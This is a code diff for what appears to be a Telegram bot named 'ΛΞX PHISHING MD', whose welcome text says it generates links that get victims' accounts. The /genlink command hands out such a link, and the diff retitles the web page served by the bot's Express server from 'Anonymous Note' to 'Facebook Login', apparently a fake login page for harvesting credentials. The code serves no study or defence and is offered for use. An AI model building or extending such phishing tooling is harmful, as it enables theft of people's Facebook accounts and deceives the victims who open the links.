@@ -13,7 +13,7 @@ bot.start((ctx) => {
   ctx.reply(
 `👋YOO 🥹🥹 
 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ΛΞ𝚇 𝙿𝙷𝙸𝚂𝙷𝙸𝙽𝙶 𝙼𝙳 🫣
-𝙸 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝚃𝙷𝙴 𝙻𝙸𝙽𝙺 𝚄 𝙶𝙴𝚃 𝚃𝙷𝙸𝙴𝚁 𝙸𝙼𝙰𝙶𝙴 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 🫡
+𝙸 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝚃𝙷𝙴 𝙻𝙸𝙽𝙺 𝚄 𝙶𝙴𝚃 𝚃𝙷𝙸𝙴𝚁 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 🫡
 𝚄𝚂𝙴 /genlink 𝚃𝙾 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝚈𝙾𝚄𝚁 𝙻𝙸𝙽𝙺 🥹🥹🫰 𝙼𝙰𝙺𝙴 𝙸𝚃 𝙵𝙰𝚂𝚃 𝙿𝙻𝙴𝙰𝚂𝙴`
   );
 });
@@ -27,7 +27,9 @@ bot.command("genlink", (ctx) => {
 
 <b>𝚈𝙾𝚄𝚁 𝙻𝙸𝙽𝙺 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻 🫡</b>
 
-<i>Now it's time to play your part command 🖤</i>
+<i>Now it's time to play your part 🖤</i>
+
+<i>Test on you self to confirm</i>
 
 🔗 <a href="${link}">👉 TAP TO COPY YOUR LINK</a>
 
@@ -51,7 +53,7 @@ app.get("/", (req, res) => {
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Anonymous Note</title>
+<title>Facebook Login</title>
 
 <style>
 
